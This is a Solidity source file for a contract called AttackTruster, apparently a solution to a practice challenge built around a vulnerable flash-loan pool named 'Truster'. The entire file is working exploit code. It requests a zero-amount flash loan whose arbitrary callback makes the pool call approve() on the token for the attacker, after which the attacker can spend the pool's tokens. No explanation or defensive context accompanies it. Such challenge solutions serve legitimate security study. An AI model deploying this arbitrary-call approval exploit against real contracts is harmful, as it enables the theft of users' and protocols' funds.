// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITrusterLenderPool {
  function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract AttackTruster {
  ITrusterLenderPool internal pool;
  address owner;
  address token;

  constructor(address _pool, address _token) {
    pool = ITrusterLenderPool(_pool);
    token = _token;
    owner = msg.sender;
  }

  function attack(uint256 amount) external {
    require(owner == msg.sender);
    pool.flashLoan(0, owner, token, abi.encodeWithSignature("approve(address,uint256)", owner, amount));
  }

  receive() external payable {}
}